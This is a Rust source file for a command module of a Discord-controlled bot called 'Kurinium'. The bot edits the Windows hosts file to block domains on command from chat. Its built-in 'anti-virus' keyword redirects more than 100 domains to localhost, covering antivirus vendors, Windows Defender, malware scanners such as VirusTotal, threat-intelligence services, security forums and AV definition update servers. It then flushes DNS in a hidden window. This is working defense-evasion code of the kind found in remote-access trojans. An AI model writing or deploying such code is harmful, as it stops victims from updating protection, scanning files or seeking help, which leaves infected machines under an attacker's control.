use crate::commands::Arguments;
use crate::commands::BotCommand;
use anyhow::Result;
use async_trait::async_trait;
use std::collections::HashSet;
use std::fs;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::embed::EmbedField;
use twilight_model::channel::message::Message;
use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder};

pub struct HostCommand;

const HOSTS_PATH: &str = r"C:\Windows\System32\drivers\etc\hosts";
const BLOCK_START: &str = "# === KURINIUM BLOCKED START ===";
const BLOCK_END: &str = "# === KURINIUM BLOCKED END ===";

// Anti-virus domains to block
const ANTIVIRUS_DOMAINS: &[&str] = &[
    // Major Antivirus Vendors
    "avast.com",
    "avg.com",
    "avira.com",
    "bitdefender.com",
    "bitdefender.net",
    "kaspersky.com",
    "kaspersky.ru",
    "mcafee.com",
    "norton.com",
    "nortonlifelock.com",
    "symantec.com",
    "eset.com",
    "malwarebytes.com",
    "malwarebytes.org",
    "trendmicro.com",
    "sophos.com",
    "f-secure.com",
    "webroot.com",
    "pandasecurity.com",
    "bullguard.com",
    "zonealarm.com",
    "comodo.com",
    "drweb.com",
    "gdata.de",
    "gdatasoftware.com",
    "quickheal.com",
    "totalav.com",
    "totaladblock.com",
    "pcprotect.com",
    "scanguard.com",
    "heimdalsecurity.com",
    "cylance.com",
    "crowdstrike.com",
    "sentinelone.com",
    "carbonblack.com",
    "vmware.com/security",
    
    // Windows Defender / Microsoft Security
    "microsoft.com/security",
    "microsoft.com/wdsi",
    "defender.microsoft.com",
    "security.microsoft.com",
    
    // Online Scanners
    "virustotal.com",
    "hybrid-analysis.com",
    "any.run",
    "joesandbox.com",
    "urlscan.io",
    "urlvoid.com",
    "opentip.kaspersky.com",
    "metadefender.opswat.com",
    "filescan.io",
    "tria.ge",
    "intezer.com",
    "cape.contextis.com",
    "app.any.run",
    "cuckoo.cert.ee",
    "virusdesk.kaspersky.com",
    "submit.symantec.com",
    "nodistribute.com",
    "antiscan.me",
    "jotti.org",
    "virscan.org",
    "majyx.net",
    "threat.zone",
    "filescan.io",
    
    // Threat Intelligence
    "abuseipdb.com",
    "threatcrowd.org",
    "threatminer.org",
    "alienvault.com",
    "otx.alienvault.com",
    "pulsedive.com",
    "shodan.io",
    "censys.io",
    "greynoise.io",
    "binaryedge.io",
    "securitytrails.com",
    "riskiq.com",
    "domaintools.com",
    "whois.domaintools.com",
    
    // Security Forums & Info
    "bleepingcomputer.com",
    "malwaretips.com",
    "wilderssecurity.com",
    "av-test.org",
    "av-comparatives.org",
    "safebrowsing.google.com",
    "transparencyreport.google.com",
    
    // Update Servers (careful with these)
    "update.avast.com",
    "update.avg.com",
    "update.kaspersky.com",
    "liveupdate.symantec.com",
    "definitions.symantec.com",
    "update.eset.com",
    "update.nai.com",
    "download.mcafee.com",
    "data-cdn.mbamupdates.com",
    "mbam-cdn.malwarebytes.com",
];

#[async_trait]
impl BotCommand for HostCommand {
    fn name(&self) -> &str { "host" }
    fn description(&self) -> &str { "Block/unblock domains via hosts file" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".host <block|unblock|list> <domain|anti-virus|all>" }
    fn examples(&self) -> &'static [&'static str] { 
        &[
            ".host block youtube.com",
            ".host block anti-virus",
            ".host unblock youtube.com",
            ".host unblock all",
            ".host list"
        ] 
    }
    fn aliases(&self) -> &'static [&'static str] { &["hosts", "dns"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                self.show_help(http, msg).await?;
                return Ok(());
            }
        };

        match action {
            "block" | "add" => {
                let target = match args.next() {
                    Some(t) => t,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("Please provide a domain or `anti-virus`\nUsage: `.host block <domain|anti-virus>`")
                            .await?;
                        return Ok(());
                    }
                };
                self.block_domain(http, msg, target).await
            }
            "unblock" | "remove" | "del" => {
                let target = match args.next() {
                    Some(t) => t,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("Please provide a domain or `all`\nUsage: `.host unblock <domain|all>`")
                            .await?;
                        return Ok(());
                    }
                };
                self.unblock_domain(http, msg, target).await
            }
            "list" | "show" | "ls" => {
                self.list_blocked(http, msg).await
            }
            _ => {
                http.create_message(msg.channel_id)
                    .content(&format!("Unknown action: `{}`\nUse: `block`, `unblock`, or `list`", action))
                    .await?;
                Ok(())
            }
        }
    }
}

impl HostCommand {
    async fn show_help(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let embed = EmbedBuilder::new()
            .title("Kurinium: Host Blocker")
            .description("Block domains by modifying the Windows hosts file")
            .color(0x3498DB)
            .field(EmbedField {
                name: "Commands".to_string(),
                value: "`.host block <domain>` - Block a domain\n\
                        `.host block anti-virus` - Block all AV sites\n\
                        `.host unblock <domain>` - Unblock a domain\n\
                        `.host unblock all` - Unblock everything\n\
                        `.host list` - Show blocked domains".to_string(),
                inline: false,
            })
            .field(EmbedField {
                name: "Examples".to_string(),
                value: "`.host block youtube.com`\n\
                        `.host block anti-virus`\n\
                        `.host unblock google.com`".to_string(),
                inline: false,
            })
            .field(EmbedField {
                name: "Special Keywords".to_string(),
                value: "**anti-virus** - Blocks 100+ antivirus & security sites\n\
                        **all** - Unblocks all Kurinium-blocked domains".to_string(),
                inline: false,
            })
            .footer(EmbedFooterBuilder::new("Requires admin privileges"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    async fn block_domain(&self, http: &Arc<HttpClient>, msg: &Message, target: &str) -> Result<()> {
        let domains_to_block: Vec<String> = if target.eq_ignore_ascii_case("anti-virus") || 
                                               target.eq_ignore_ascii_case("antivirus") ||
                                               target.eq_ignore_ascii_case("av") {
            ANTIVIRUS_DOMAINS.iter()
                .flat_map(|d| Self::expand_domain(d))
                .collect()
        } else {
            Self::expand_domain(target)
        };

        let hosts_content = match fs::read_to_string(HOSTS_PATH) {
            Ok(c) => c,
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Failed to read hosts file: {}\n\n*Make sure the bot has admin privileges*", e))
                    .await?;
                return Ok(());
            }
        };

        let mut blocked = Self::parse_blocked_domains(&hosts_content);
        let original_count = blocked.len();

        for domain in &domains_to_block {
            blocked.insert(domain.clone());
        }

        let new_count = blocked.len() - original_count;

        if let Err(e) = Self::write_hosts_file(&hosts_content, &blocked) {
            http.create_message(msg.channel_id)
                .content(&format!("Failed to write hosts file: {}\n\n*Make sure the bot has admin privileges*", e))
                .await?;
            return Ok(());
        }

        Self::flush_dns();
        let response = if target.eq_ignore_ascii_case("anti-virus") || 
                         target.eq_ignore_ascii_case("antivirus") ||
                         target.eq_ignore_ascii_case("av") {
            format!("**Anti-Virus Block Enabled**\n\n\
                     Blocked **{}** new domains ({} total AV domains)\n\
                     DNS cache flushed", 
                    new_count, blocked.len())
        } else {
            if new_count > 0 {
                format!("Blocked `{}`\nDNS cache flushed", target)
            } else {
                format!("`{}` is already blocked", target)
            }
        };

        http.create_message(msg.channel_id)
            .content(&response)
            .await?;

        Ok(())
    }

    async fn unblock_domain(&self, http: &Arc<HttpClient>, msg: &Message, target: &str) -> Result<()> {
        let hosts_content = match fs::read_to_string(HOSTS_PATH) {
            Ok(c) => c,
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Failed to read hosts file: {}", e))
                    .await?;
                return Ok(());
            }
        };

        let mut blocked = Self::parse_blocked_domains(&hosts_content);
        let original_count = blocked.len();

        if target.eq_ignore_ascii_case("all") || target == "*" {
            blocked.clear();
        } else {
            let variants = Self::expand_domain(target);
            for v in variants {
                blocked.remove(&v);
            }
        }

        let removed_count = original_count - blocked.len();
        if let Err(e) = Self::write_hosts_file(&hosts_content, &blocked) {
            http.create_message(msg.channel_id)
                .content(&format!("Failed to write hosts file: {}", e))
                .await?;
            return Ok(());
        }

        Self::flush_dns();

        let response = if target.eq_ignore_ascii_case("all") || target == "*" {
            if removed_count > 0 {
                format!("**Unblocked all {} domains**\nDNS cache flushed", removed_count)
            } else { "No domains were blocked".to_string() }
        } else {
            if removed_count > 0 {
                format!("Unblocked `{}`\nDNS cache flushed", target)
            } else { format!("`{}` was not blocked", target) }
        };

        http.create_message(msg.channel_id)
            .content(&response)
            .await?;

        Ok(())
    }

    async fn list_blocked(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let hosts_content = match fs::read_to_string(HOSTS_PATH) {
            Ok(c) => c,
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Failed to read hosts file: {}", e))
                    .await?;
                return Ok(());
            }
        };

        let blocked = Self::parse_blocked_domains(&hosts_content);

        if blocked.is_empty() {
            http.create_message(msg.channel_id)
                .content("No domains are currently blocked")
                .await?;
            return Ok(());
        }

        let mut base_domains: HashSet<String> = HashSet::new();
        for domain in &blocked {
            let base = domain.strip_prefix("www.").unwrap_or(domain);
            base_domains.insert(base.to_string());
        }

        let mut sorted: Vec<_> = base_domains.into_iter().collect();
        sorted.sort();

        let list_text = if sorted.len() <= 50 {
            sorted.iter()
                .enumerate()
                .map(|(i, d)| format!("{}. {}", i + 1, d))
                .collect::<Vec<_>>()
                .join("\n")
        } else {
            let preview: Vec<_> = sorted.iter().take(30).cloned().collect();
            format!("{}\n... and {} more", 
                    preview.iter()
                        .enumerate()
                        .map(|(i, d)| format!("{}. {}", i + 1, d))
                        .collect::<Vec<_>>()
                        .join("\n"),
                    sorted.len() - 30)
        };

        let embed = EmbedBuilder::new()
            .title("Blocked Domains")
            .description(format!("**{}** unique domains blocked:\n```\n{}\n```", 
                                 sorted.len(), list_text))
            .color(0xE74C3C)
            .footer(EmbedFooterBuilder::new("Use .host unblock <domain> or .host unblock all"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;
        Ok(())
    }

    // Expand domain to include www variant
    fn expand_domain(domain: &str) -> Vec<String> {
        let domain = domain.trim().to_lowercase();
        let domain = domain.strip_prefix("http://").unwrap_or(&domain);
        let domain = domain.strip_prefix("https://").unwrap_or(domain);
        let domain = domain.split('/').next().unwrap_or(domain);
        
        let mut variants = vec![domain.to_string()];
        
        if !domain.starts_with("www.") {
            variants.push(format!("www.{}", domain));
        } else {
            variants.push(domain.strip_prefix("www.").unwrap().to_string());
        }
        
        variants
    }

    fn parse_blocked_domains(content: &str) -> HashSet<String> {
        let mut blocked = HashSet::new();
        let mut in_our_section = false;

        for line in content.lines() {
            let line = line.trim();
            
            if line == BLOCK_START {
                in_our_section = true;
                continue;
            }
            if line == BLOCK_END {
                in_our_section = false;
                continue;
            }

            if in_our_section && !line.is_empty() && !line.starts_with('#') {
                // Parse: 127.0.0.1 domain.com
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 && (parts[0] == "127.0.0.1" || parts[0] == "0.0.0.0") {
                    blocked.insert(parts[1].to_lowercase());
                }
            }
        }

        blocked
    }

    fn write_hosts_file(original_content: &str, blocked: &HashSet<String>) -> Result<()> {
        let mut new_content = String::new();
        let mut skipping_our_section = false;

        for line in original_content.lines() {
            if line.trim() == BLOCK_START {
                skipping_our_section = true;
                continue;
            }
            if line.trim() == BLOCK_END {
                skipping_our_section = false;
                continue;
            }
            if !skipping_our_section {
                new_content.push_str(line);
                new_content.push('\n');
            }
        }

        if !blocked.is_empty() {
            new_content.push_str("\n");
            new_content.push_str(BLOCK_START);
            new_content.push_str("\n");
            
            let mut sorted: Vec<_> = blocked.iter().collect();
            sorted.sort();
            
            for domain in sorted {
                new_content.push_str(&format!("127.0.0.1 {}\n", domain));
            }
            
            new_content.push_str(BLOCK_END);
            new_content.push_str("\n");
        }

        fs::write(HOSTS_PATH, new_content)?;
        
        Ok(())
    }

    fn flush_dns() {
        use std::process::Command;
        use std::os::windows::process::CommandExt;
        let _ = Command::new("ipconfig")
            .args(["/flushdns"])
            .creation_flags(0x08000000)
            .output();
    }
}